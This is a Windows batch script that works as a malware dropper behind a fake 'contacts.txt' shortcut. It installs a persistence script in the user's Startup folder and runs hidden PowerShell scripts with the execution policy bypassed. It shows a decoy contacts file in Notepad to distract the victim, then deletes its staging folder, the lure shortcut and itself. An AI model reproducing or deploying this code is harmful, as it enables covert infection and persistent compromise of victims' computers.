@echo off
pushd %~dp0

attrib -h .\h

move ".\h\persist.cmd" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -NoP -W H -ep bypass notepad h\contacts.txt;.\h\exception.ps1;.\h\initial.ps1;rm .\contacts.txt.lnk;Move-Item -Path .\h\contacts.txt -Destination .\contacts.txt;Move-Item -Path .\h\persist.ps1 -Destination "$env:AppData";Remove-Item .\h\ -Recurse -Force;Remove-Item $PSCommandPath -Force

attrib -h %0
DEL %0



